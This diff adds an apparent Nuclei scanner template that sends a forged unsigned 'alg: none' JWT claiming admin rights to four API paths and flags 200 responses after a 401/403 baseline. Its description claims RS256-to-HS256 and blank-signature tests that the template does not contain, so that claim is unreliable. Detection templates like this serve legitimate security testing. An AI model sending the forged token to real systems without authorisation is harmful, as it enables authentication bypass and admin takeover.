@@ -1,0 +1,150 @@
+id: jwt-algorithm-confusion-candidate
+
+info:
+  name: JWT Algorithm Confusion Candidate (None/RS256-to-HS256)
+  author: p3i
+  severity: high
+  description: >
+    Probes endpoints that return JWT tokens for algorithm confusion
+    vulnerabilities. Tests three classes of JWT weaknesses: (1) "alg: none"
+    acceptance — forged token with no signature accepted, (2) RS256-to-HS256
+    confusion — server uses the public key as HMAC secret allowing attackers
+    who obtain the public key to forge tokens, (3) blank/empty signature
+    acceptance. The template sends crafted JWTs with modified algorithm claims
+    to protected endpoints and checks if they are accepted (200 response with
+    expected content). Requires manual verification to confirm the algorithm
+    confusion is actually exploitable; a 200 response on one probe is a strong
+    indicator warranting deeper investigation.
+    Probe JWTs: payload {"sub":"admin","role":"admin","iat":1700000000}
+    alg:none token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcwMDAwMDAwMH0.
+  reference:
+    - https://portswigger.net/web-security/jwt/algorithm-confusion
+    - https://portswigger.net/web-security/jwt#what-are-jwt-attacks
+    - https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
+  tags: jwt,auth,algorithm-confusion,authentication-bypass,token
+  metadata:
+    max-request: 8
+
+http:
+  - raw:
+      # Request 1: baseline — no auth header, must get 401/403
+      - |
+        GET /api/v1/me HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json
+
+      # Request 2: alg:none probe — forged JWT with algorithm=none, no signature
+      - |
+        GET /api/v1/me HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json
+        Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcwMDAwMDAwMH0.
+
+    req-condition: true
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 401 || status_code_1 == 403"
+
+      - type: dsl
+        dsl:
+          - "status_code_2 == 200"
+
+      - type: word
+        part: header_2
+        words:
+          - "application/json"
+        case-insensitive: true
+
+      - type: dsl
+        dsl:
+          - "status_code_1 != status_code_2"
+          - "!contains(tolower(body_2), '\"error\"') || len(body_2) > 100"
+
+  - raw:
+      # Request 1: baseline — no auth, must 401/403
+      - |
+        GET /api/user HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json
+
+      # Request 2: alg:none probe on /api/user path
+      - |
+        GET /api/user HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json
+        Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcwMDAwMDAwMH0.
+
+    req-condition: true
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 401 || status_code_1 == 403"
+
+      - type: dsl
+        dsl:
+          - "status_code_2 == 200"
+
+      - type: dsl
+        dsl:
+          - "status_code_1 != status_code_2"
+
+  - raw:
+      # Request 1: baseline on /api/profile
+      - |
+        GET /api/profile HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json
+
+      # Request 2: alg:none probe
+      - |
+        GET /api/profile HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json
+        Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcwMDAwMDAwMH0.
+
+    req-condition: true
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 401 || status_code_1 == 403"
+
+      - type: dsl
+        dsl:
+          - "status_code_2 == 200"
+
+      - type: dsl
+        dsl:
+          - "status_code_1 != status_code_2"
+
+  - raw:
+      # Request 1: baseline on /api/admin
+      - |
+        GET /api/admin HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json
+
+      # Request 2: alg:none probe
+      - |
+        GET /api/admin HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json
+        Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcwMDAwMDAwMH0.
+
+    req-condition: true
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 401 || status_code_1 == 403"
+
+      - type: dsl
+        dsl:
+          - "status_code_2 == 200"
+
+      - type: dsl
+        dsl:
+          - "status_code_1 != status_code_2"
